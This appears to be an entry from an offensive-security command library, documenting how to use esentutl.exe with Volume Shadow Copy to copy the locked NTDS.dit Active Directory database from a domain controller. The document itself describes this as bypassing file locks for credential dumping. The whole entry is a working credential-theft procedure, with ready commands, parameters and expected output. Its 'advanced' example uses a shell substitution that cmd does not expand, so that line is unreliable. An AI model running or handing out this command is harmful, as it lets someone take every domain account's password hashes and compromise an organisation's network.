---
id: da3b4c8b-8e95-4c5c-b042-99a93ae9f58d
name: esentutl-backup-ntds-dit
type: command
executor: cmd
data: esentutl.exe /y /vss %SystemRoot%\ntds\ntds.dit /d $_DESTINATION_PATH
output: null
created_at: '2023-04-06T03:56:03.932787+00:00'
updated_at: '2023-04-10T20:25:54.587753+00:00'
platforms:
  - Windows
tags:
  - credential-access
  - active-directory
verified: true
validated: true
---

# esentutl-backup-ntds-dit

## Command

```cmd
esentutl.exe /y /vss %SystemRoot%\ntds\ntds.dit /d $_DESTINATION_PATH
```

## Description

This command uses esentutl.exe to create a Volume Shadow Copy and backup the NTDS.dit file from an Active Directory database to a specified location, bypassing file locks for credential dumping.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /y | Force overwrite of destination file if it exists | Yes |
| /vss | Use Volume Shadow Copy Service to access locked files | Yes |
| %SystemRoot%\ntds\ntds.dit | Source path to the NTDS.dit file (default on domain controllers) | Yes |
| /d $_DESTINATION_PATH | Destination path for the backup file (e.g., C:\temp\ntds.dit) | Yes |
| $_DESTINATION_PATH | User-specified full path for the output file | Yes |

## Examples

### Basic Usage

```cmd
esentutl.exe /y /vss C:\Windows\ntds\ntds.dit /d C:\temp\ntds.dit
```

### Advanced Usage

```cmd
esentutl.exe /y /vss %SystemRoot%\ntds\ntds.dit /d D:\backups\ntds_$(date /t).dit
```

## Expected Output

Microsoft(R) Extensible Storage Engine DB Recovery Utility (build 15063:7601)

Initializing...
Copying database: c:\windows\ntds\ntds.dit
Using VSS...
Operation completed successfully in X.XX seconds.

The command outputs progress and completion status. Success is indicated by 'Operation completed successfully' without errors like 'Access denied' or 'VSS unavailable'.

## Related

- [[procedures/Dump-NTDS-DIT-Using-Esentutl]]
